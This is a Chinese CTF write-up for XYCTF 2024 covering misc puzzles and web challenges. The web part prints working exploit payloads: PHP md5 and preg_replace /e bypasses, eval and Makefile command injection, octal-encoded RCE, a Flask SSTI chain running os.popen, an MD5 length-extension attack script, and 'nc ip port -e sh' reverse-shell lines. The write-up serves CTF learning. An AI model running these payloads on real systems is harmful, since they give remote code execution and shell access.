---
title: XYCTF 2024 
description: web&misc wp
tags:
  - CTF
  - MISC
  - WEB
categories:
  - write up
cover: 'https://tuchuang.voooe.cn/images/2024/05/05/_20240505210108.jpg'
abbrlink: XYCTF2024
date: 2024-05-05 20:54:00
---
## MISC

### game

> adwa 最近迷恋上了一款游戏，他给我们发了这款游戏里的一个解密项目，请你根据这张图片，找出这个游戏的英文名，并用 XYCTF{}包括 (每个单词开头要大写，例如 XYCTF{Dead Cells})

搜索图片上面的特征图标即可找到

![](https://s2.loli.net/2024/05/05/YgK9JfvG81UWy7X.png)

**XYCTF{Papers,Please}**

### 熊博士

> 熊大熊二在森林里玩耍的时候捡到了一张小纸条，可能事关森林的安危，但是上面的字他们看不懂，你能帮他们看看这些神秘的字符是什么意思吗？

![](https://s2.loli.net/2024/05/05/ELDfTmB5K6MvwH9.png)

atbash 解密

**XYCTF{liu_ye_mei_you_xiao_jj}**

### **zzl 的护理小课堂**

```javascript
<script>
        document.getElementById('quizForm').addEventListener('submit', function(event) {
            event.preventDefault(); 
    
            var formData = new FormData(this);
    
            var xhr = new XMLHttpRequest(); 
            xhr.open('POST', 'getScore.php', true); 
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) { 
                    var score = xhr.responseText;
                    if (score == 100) {
                        document.getElementById('scoreDisplay').innerText = "你的分数是: " + score + "/100 杂鱼,怎么才100分啊";
                    } else if (score < 100) {
                        document.getElementById('scoreDisplay').innerText = "你的分数是: " + score + "/100 noooooob!!";
                    } else {
                        var flagXhr = new XMLHttpRequest(); 
                        flagXhr.open('GET', 'flag.php', true);
                        flagXhr.onreadystatechange = function() {
                            if (flagXhr.readyState === 4 && flagXhr.status === 200) {
                                var flag = flagXhr.responseText;
                                document.getElementById('scoreDisplay').innerText = "Flag: " + flag;
                            }
                        };
                        flagXhr.send(); // 发送请求获取 flag
                    }
                }
            };
            xhr.send(formData); // 发送请求获取分数
        });
    </script>
```

找到源码，分数得大于 100 分才有 flag，访问/flag.php,并 POST：score=101 得到 flag

**XYCTF{ZZL_TeIL_y0u_462ac0c38028}**

### ez_隐写

附件 zip 伪加密，改 09 为 00 后打开得到 hint.png 和真加密的 zip

hint.png 经过 puzzlesolve 修复后打开得到提示密码：XYCTF 开赛日期（20240401）

![](https://s2.loli.net/2024/05/05/hdKEBQRA9UpySsD.png)

解压后得到 WATERMARK.jpg

盲水印解密后得到 flag

**XYCTF{159-WSX-IJN-852}**

### 真 > 签到

拿到 zip 不用解压，直接在十六进制数据中得到 flag

![](https://s2.loli.net/2024/05/05/rhR3FS4mVZKTusA.png)

**XYCTF{59bd0e77d13c_1406b23219e_f91cf3a_153e8ea4_77508ba}**


### **出题有点烦**

开头的加密是弱口令（123456）

拿到的五张图只有最后一张是有用的，binwalk 分离出一个压缩包，爆破出密码为（xyctf）得到 flag

> 没活硬整属于是

**XYCTF{981e5_f3ca30_c841487_830f84_fb433e}**

### 我的二维码为啥扫不出来

得到二维码和加密脚本

解读脚本可知是把这个 var2(25*25)的二维码随机抽取了某行或某列进行反色，这样的操作进行了七次

根据二维码定位用的特征符可以手工判断出反色了行 2，列 1,3,6 这里解决了四次，剩下的三次使用脚本爆破

```python
from PIL import Image

def reverse_color(x):
    return 0 if x == 255 else 255

def reverse_row_colors(pixels, row, width, block_size=10):
    for x_block in range(width // block_size):
        x = x_block * block_size
        y = row * block_size
        for x_small in range(x, x + block_size):
            for y_small in range(y, y + block_size):
                pixel = pixels[x_small, y_small]
                pixels[x_small, y_small] = reverse_color(pixel)

def reverse_col_colors(pixels, col, height, block_size=10):
    for y_block in range(height // block_size):
        x = col * block_size
        y = y_block * block_size
        for x_small in range(x, x + block_size):
            for y_small in range(y, y + block_size):
                pixel = pixels[x_small, y_small]
                pixels[x_small, y_small] = reverse_color(pixel)

original_img = Image.open("new.png")
width, height = original_img.size
pixels = original_img.load()

# 已知需要反色的行和列
known_rows_to_reverse = [1]
known_cols_to_reverse = [0, 2, 5]

# 将已知的行和列进行反色
for row in known_rows_to_reverse:
    reverse_row_colors(pixels, row, width)
for col in known_cols_to_reverse:
    reverse_col_colors(pixels, col, height)

# 枚举所有可能的组合，将结果保存为不同的PNG文件
for i in range(9, 17):
    for j in range(9, 17):
        if i not in known_rows_to_reverse and j not in known_cols_to_reverse:
            temp_img = original_img.copy()
            reverse_row_colors(temp_img.load(), i, width)
            reverse_col_colors(temp_img.load(), j, height)
            temp_img.save(f"result_row_{i}_col_{j}.png")
```

得到大量的二维码，工具批量扫描得到 flag

![](https://s2.loli.net/2024/05/05/W8sTpqe3EhyrVKZ.png)

**flag{qR_c0d3_1s_s0_fun}**

补：从第一 wp 学到知识

![](https://s2.loli.net/2024/05/05/RAaTjKO3ZSvcMUr.png)

### **EZ_Base1024*2**

[Encode and Decode Base2048 Online Tool](https://nerdmosis.com/tools/encode-and-decode-base2048)

## WEB

### **warm up**

```php
<?php
include 'next.php';
highlight_file(__FILE__);
$XYCTF = "Warm up";
extract($_GET);

if (isset($_GET['val1']) && isset($_GET['val2']) && $_GET['val1'] != $_GET['val2'] && md5($_GET['val1']) == md5($_GET['val2'])) {
    echo "ez" . "<br>";
} else {
    die("什么情况,这么基础的md5做不来");
}

if (isset($md5) && $md5 == md5($md5)) {
    echo "ezez" . "<br>";
} else {
    die("什么情况,这么基础的md5做不来");
}

if ($XY == $XYCTF) {
    if ($XY != "XYCTF_550102591" && md5($XY) == md5("XYCTF_550102591")) {
        echo $level2;
    } else {
        die("什么情况,这么基础的md5做不来");
    }
} else {
    die("学这么久,传参不会传?");
}
```

payload1：

`?val1=MMHUWUV&val2=MAUXXQC&md5=0e215962017&XY=0e1284838308&XYCTF=0e1284838308`

```php
<?php
highlight_file(__FILE__);
if (isset($_POST['a']) && !preg_match('/[0-9]/', $_POST['a']) && intval($_POST['a'])) {
    echo "操作你O.o";
    echo preg_replace($_GET['a'],$_GET['b'],$_GET['c']);  // 我可不会像别人一样设置10来个level
} else {
    die("有点汗流浃背");
}
```

payload2：

`/LLeeevvveeelll222.php?a=/xxx/e&b=system('tac /flag');&c=xxx`

`POST：a[]=`

### **ezhttp**

开始是登录界面在源码注释处找到 hint

> 为了防止忘记密码，我把它们放在某个地方了

访问/robots.txt,被引路到/l0g1n.txt 得到账号密码

`username: XYCTF`

`password: @JOILha!wuigqi123$`

登录后按提示伪造 http 头

via:ymzx.qq.com

Client-IP:127.0.0.1

cookie:XYCTF

Referer:yuanshen.com

User-Agent:XYCTF

得到 flag

### ezmd5

[制造 MD5 碰撞](https://zhangshuqiao.org/2018-02/%E5%88%B6%E9%80%A0MD5%E7%A2%B0%E6%92%9E/)

上传两张 md5 值相同的 jpg 图片得到 flag
### 牢牢记住，逝者为大
```php
<?php
highlight_file(__FILE__);
function Kobe($cmd)
{
    if (strlen($cmd) > 13) {
        die("see you again~");
    }
    if (preg_match("/echo|exec|eval|system|fputs|\.|\/|\\|/i", $cmd)) {
        die("肘死你");
    }
    foreach ($_GET as $val_name => $val_val) {
        if (preg_match("/bin|mv|cp|ls|\||f|a|l|\?|\*|\>/i", $val_val)) {
            return "what can i say";
        }
    }
    return $cmd;
}

$cmd = Kobe($_GET['cmd']);
echo "#man," . $cmd  . ",manba out";
echo "<br>";
eval("#man," . $cmd . ",mamba out");

#man,,manba out
```

重点在最下面的eval，前面和后面都有内容来影响命令执行
前面用换行%0a来截断，后面用;+#来注释掉，
实际测试时发现要进行url编码否则绕不过，构造payload：
**cmd=%0a\`$_GET[1]\`;%23&1=c\'\'p /[\@-z][\@-z][@-z]g . （把flag复制到当前目录来，然后访问直接下载flag）**
**cmd=%0a\`$_GET[1]\`;%23&1=nc ip port -e sh; (反弹shell)**


### ezMake

[Makefile 学习笔记之 shell 命令调用及目录处理 - coffee_tea_or_me - 博客园](https://www.cnblogs.com/phillee/p/15020046.html)

command：$(shell cat flag)

### ez?Make

同上多了过滤，目录穿越

cd \.\.&&cd \.\.&&cd \.\.&&more [^e][^e][^e][^e]

[^e]表示除了 e 以外的其他的字符

反弹 shell 也可以

` nc ip port -e sh`

vps 开监听端口即可

`nc -lvnp port`

![](https://s2.loli.net/2024/05/05/FXutQMcLWCV1mHz.png)

### **εZ?¿м@Kε¿?**

> 参考第一名的 wp

[Makefile 中的$@, $^, $< , $?, $%, $+, $*-CSDN 博客](https://blog.csdn.net/dlf1769/article/details/78997967)

在 Makefile 中，大家经常会见到类似$@、$^、$< 这种类型的变量。

这种变量一般称为自动变量，自动变量是局部变量，作用域范围在当前的规则内，它们分别代表不同的含义：

$@：目标

$^：所有目标依赖

$<：目标依赖列表中的第一个依赖

$?：所有目标依赖中被修改过的文件

这里第一个依赖是就是 /flag

利用 shell 变量替换符 $(<file)读文件

`$$(<$<)` 读出/flag

<u>这里两个 $$ 才代表一个 $ </u>

### **ezRCE**

```php
<?php
highlight_file(__FILE__);
function waf($cmd){
    $white_list = ['0','1','2','3','4','5','6','7','8','9','\\','\'','$','<']; 
    $cmd_char = str_split($cmd);
    foreach($cmd_char as $char){
        if (!in_array($char, $white_list)){
            die("really ez?");
        }
    }
    return $cmd;
}
$cmd=waf($_GET["cmd"]);
system($cmd);
```

构造八进制脚本

```php
def convert_to_octal(string):
    octal_string = ""
    for char in string:
        octal_char = oct(ord(char))[2:]
        # 如果八进制不够三位，则在前面补零
        if len(octal_char) < 3:
            octal_char = "0" * (3 - len(octal_char)) + octal_char
        octal_string += "\\" + octal_char
    return  octal_string 

user_input = input("请输入字符串：")
result = convert_to_octal(user_input)
print("转换后的结果为:", result)
```

payload：

`Ls   ->   $'\154\163'`

测试中发现传空格就不行，并且白名单中还剩 < 没用上

在 linux 中 < <> 都可以表示空格

**最终 payload：**

`$'\164\141\143'<'\057\146\154\141\147'  = tac /flag` 得到 flag

后续发现空格不是被过滤而是传上去被解析转义了，可通过这篇文章找到答案

[利用 shell 脚本变量构造无字母数字命令 - 先知社区](https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc%2BEH4iTwQz0Ki%3D74D)

### **我是一个复读机**

> 本地包用 bp 的内嵌浏览器打开来抓包

打开是登录界面，给了用户名和字典直接爆破即可

![](https://s2.loli.net/2024/05/05/tv8fQJAOlnZBrqG.png)

`username=admin&password=asdqwe`

进去之后是 ssti
出题人wp：

> 进入之后可以看到输入什么可以在前端页面反应，输入中文会变成{}，这里如果尝试写两个中文
加77，类似:￥，77，可以得到回显49
这里就比较明显是一个flask的ssti，鉴于如果出常规flask的ssti会被工具一把梭，类似fengjin。
所以搞一个中文防止被一把过。

```ssti
你好()|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3)
()|attr(request.values.x4)
(221)|attr(request.values.x5)|attr(request.values.x6)|attr(request.values.x4
)(request.values.x7)|attr(request.values.x4)(request.values.x8)
(request.values.x9)&x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem_
_&x5=__init__&x6=__globals__&x7=__builtins__&x8=eval&x9=__import__('os').pop
en('cat /flag').read()
```

### **give me flag**

```php
<?php
include('flag.php');
$FLAG_md5 = md5($FLAG);
if(!isset($_GET['md5']) || !isset($_GET['value']))
{
    highlight_file(__FILE__);
    die($FLAG_md5);
}

$value = $_GET['value'];
$md5 = $_GET['md5'];
$time = time();

if(md5($FLAG.$value.$time)===$md5)
{
    echo "yes, give you flag: ";
    echo $FLAG;
}
b83a01a61c8e63f7c905cf71aab83117
```
> 学习第一的wp

哈希长度拓展攻击
[Unix 时间戳(Unix timestamp)转换工具 - 站长工具](https://tool.chinaz.com/tools/unixtime.aspx)
将当前时间戳往后 100 秒
比如当前时间戳为1714025400 那就加100：1714025500
根据平台特性是动态flag 位数是固定的43位
然后用 hash_ext_attack.py构造一个payload
![](https://s2.loli.net/2024/05/07/2iSTUeBqAvHuyj5.png)
> 注意提交的$value
是 %80%00%00%00%00%00%00%00%00%00%00%00%00X%01%00%00%00%00%00%001714025500 去掉后缀的
时间戳 `%80%00%00%00%00%00%00%00%00%00%00%00%00X%01%00%00%00%00%00%00

使用脚本不断请求
```python
import requests

url='URI/?md5=xxx&value=xxx'

while True:
    res=requests.get(url=url)
    if "{" in res.text:
        print(res.text)
        break
```

官方脚本如下

```python
import hashlib
import math
from typing import Any, Dict, List

rotate_amounts = [7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,
                  5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20,
                  4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,
                  6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21]

constants = [int(abs(math.sin(i + 1)) * 2 ** 32) & 0xFFFFFFFF for i in range(64)]

functions = 16 * [lambda b, c, d: (b & c) | (~b & d)] + \
            16 * [lambda b, c, d: (d & b) | (~d & c)] + \
            16 * [lambda b, c, d: b ^ c ^ d] + \
            16 * [lambda b, c, d: c ^ (b | ~d)]

index_functions = 16 * [lambda i: i] + \
                  16 * [lambda i: (5 * i + 1) % 16] + \
                  16 * [lambda i: (3 * i + 5) % 16] + \
                  16 * [lambda i: (7 * i) % 16]

def get_init_values(A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe, D: int = 0x10325476)-> List[int]:
    return [A, B, C, D]


def left_rotate(x, amount):
    x &= 0xFFFFFFFF
    return ((x << amount) | (x >> (32 - amount))) & 0xFFFFFFFF


def padding_message(msg: bytes) -> bytes:
    """
    在MD5算法中，首先需要对输入信息进行填充，使其位长对512求余的结果等于448，并且填充必
须进行，即使其位长对512求余的结果等于448。
    因此，信息的位长（Bits Length）将被扩展至N*512+448，N为一个非负整数，N可以是零。
    填充的方法如下：
        1) 在信息的后面填充一个1和无数个0，直到满足上面的条件时才停止用0对信息的填充。
        2) 在这个结果后面附加一个以64位二进制表示的填充前信息长度（单位为Bit），如果二
进制表示的填充前信息长度超过64位，则取低64位。
    经过这两步的处理，信息的位长=N*512+448+64=(N+1）*512，即长度恰好是512的整数倍。这
样做的原因是为满足后面处理中对信息长度的要求。
    """
    orig_len_in_bits = (8 * len(msg)) & 0xffffffffffffffff
    msg += bytes([0x80])
    while len(msg) % 64 != 56:
        msg += bytes([0x00])
    msg += orig_len_in_bits.to_bytes(8, byteorder = 'little')
    return msg


def md5(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe, D: int = 0x10325476) -> int:
    message = padding_message(message)
    hash_pieces = get_init_values(A, B, C, D)[:]
    for chunk_ofst in range(0, len(message), 64):
        a, b, c, d = hash_pieces
        chunk = message[chunk_ofst:chunk_ofst + 64]
        for i in range(64):
            f = functions[i](b, c, d)
            g = index_functions[i](i)
            to_rotate = a + f + constants[i] + int.from_bytes(chunk[4 * g:4 *g + 4], byteorder = 'little')
            new_b = (b + left_rotate(to_rotate, rotate_amounts[i])) & 0xFFFFFFFF
            a, b, c, d = d, new_b, b, c
        for i, val in enumerate([a, b, c, d]):
            hash_pieces[i] += val
            hash_pieces[i] &= 0xFFFFFFFF

    return sum(x << (32 * i) for i, x in enumerate(hash_pieces))


def md5_to_hex(digest: int) -> str:
    raw = digest.to_bytes(16, byteorder = 'little')
    return '{:032x}'.format(int.from_bytes(raw, byteorder = 'big'))


def get_md5(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C: int= 0x98badcfe, D: int = 0x10325476) -> str:
    return md5_to_hex(md5(message, A, B, C, D))

def md5_attack(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe,D: int = 0x10325476) -> int:
    hash_pieces = get_init_values(A, B, C, D)[:]
    for chunk_ofst in range(0, len(message), 64):
        a, b, c, d = hash_pieces
        chunk = message[chunk_ofst:chunk_ofst + 64]
        for i in range(64):
            f = functions[i](b, c, d)
            g = index_functions[i](i)
            to_rotate = a + f + constants[i] + int.from_bytes(chunk[4 * g:4 *g + 4], byteorder = 'little')
            new_b = (b + left_rotate(to_rotate, rotate_amounts[i])) & 0xFFFFFFFF
            a, b, c, d = d, new_b, b, c
        for i, val in enumerate([a, b, c, d]):
            hash_pieces[i] += val
            hash_pieces[i] &= 0xFFFFFFFF

    return sum(x << (32 * i) for i, x in enumerate(hash_pieces))



def get_init_values_from_hash_str(real_hash: str) -> List[int]:
    """
    Args:
        real_hash: 真实的hash结算结果

    Returns: 哈希初始化值[A, B, C, D]
    """
    str_list: List[str] = [real_hash[i * 8:(i + 1) * 8] for i in range(4)]
    # 先按照小端字节序将十六进制字符串转换成整数，然后按照大端字节序重新读取这个数字
    return [int.from_bytes(int('0x' + s, 16).to_bytes(4, byteorder = 'little'), byteorder = 'big') for s in str_list]



def get_md5_attack_materials(origin_msg: bytes, key_len: int, real_hash: str,append_data: bytes) -> Dict[str, Any]:
    """
    Args:
        origin_msg: 原始的消息字节流
        key_len: 原始密钥（盐）的长度
        real_hash: 计算出的真实的hash值
        append_data: 需要添加的攻击数据

    Returns: 发起攻击需要的物料信息
        {
        'attack_fake_msg': bytes([...]),
        'attack_hash_value': str(a1b2c3d4...)
        }
    """
    init_values = get_init_values_from_hash_str(real_hash)
    # print(['{:08x}'.format(x) for x in init_values])
    # 只知道key的长度，不知道key的具体内容时，任意填充key的内容
    fake_key: bytes = bytes([0xff for _ in range(key_len)])
    # 计算出加了append_data后的真实填充数据
    
    finally_padded_attack_data = padding_message(padding_message(fake_key + origin_msg) + append_data)
    # 攻击者提前计算添加了攻击数据的哈希
    attack_hash_value = md5_to_hex(md5_attack(finally_padded_attack_data[len(padding_message(fake_key + origin_msg)):],A = init_values[0],B = init_values[1],C = init_values[2],D = init_values[3]))
    fake_padding_data = padding_message(fake_key + origin_msg)[len(fake_key +origin_msg):]
    attack_fake_msg = origin_msg + fake_padding_data + append_data
    return {'attack_fake_msg': attack_fake_msg,'attack_hash_value': attack_hash_value}


def req(data,md5):
    import requests
    new_data = ''
    for i in data:
        tmp = hex(i)[2:]
        if len(tmp) == 1:
            tmp = '0'+tmp
        new_data += '%'+tmp
    url = 'http://gz.imxbt.cn:20379/'
    r = requests.get(url+f'?value={new_data}&md5={md5}').text
    print(r)
    if 'yes' in r:
        print(r)
        exit()
if __name__ == '__main__':
    data: bytes = b"}"
    import time
    md5_value = '1ebd3886123262af5b633ad5d225c965'
    key_len = 42
    while True:
        start = time.time()
        print(key_len)
        attack_data = str(int(time.time()+3.5)).encode()
        attack_materials = get_md5_attack_materials(data, key_len, md5_value,attack_data)
        # print(attack_materials['attack_fake_msg'][1:-10])
        # print(attack_data)
        req(attack_materials['attack_fake_msg'][1:-len(attack_data)],attack_materials['attack_hash_value'])
        print(time.time()-start)


```
